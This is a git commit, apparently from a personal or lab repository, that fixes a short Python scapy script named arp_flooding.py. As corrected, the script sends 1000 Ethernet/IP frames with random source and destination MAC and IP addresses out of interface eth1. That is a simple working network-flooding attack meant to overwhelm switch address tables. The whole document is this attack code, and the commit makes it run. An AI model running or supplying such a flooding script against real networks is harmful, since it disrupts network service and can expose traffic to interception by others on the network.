8da65c12a887c0d3e2247ad1b642d3b2214dbc37
shan501 <shanyuzhang123@gmail.com>
2021-09-21 00:05:44 -0400

    arp_flooding

--- arp_flooding.py
+++ arp_flooding.py
@@ -1,12 +1,12 @@
 #! /usr/bin/env python3 
-from scapy import RandMAC , RandIP , Ether , IP , sendp 
+from scapy.all import RandMAC , RandIP , Ether , IP , sendp 
 
-for i in (1000):
+for i in range (1000):
     interface = 'eth1'
     randomMac = RandMAC()
     randomIP = RandIP()
     mac = Ether(src=randomMac,dst=randomMac)
-    ip = IP(src=randomip , dst=randomIP)
+    ip = IP(src=randomIP , dst=randomIP)
     packet = mac/ip
     sendp(packet)
 
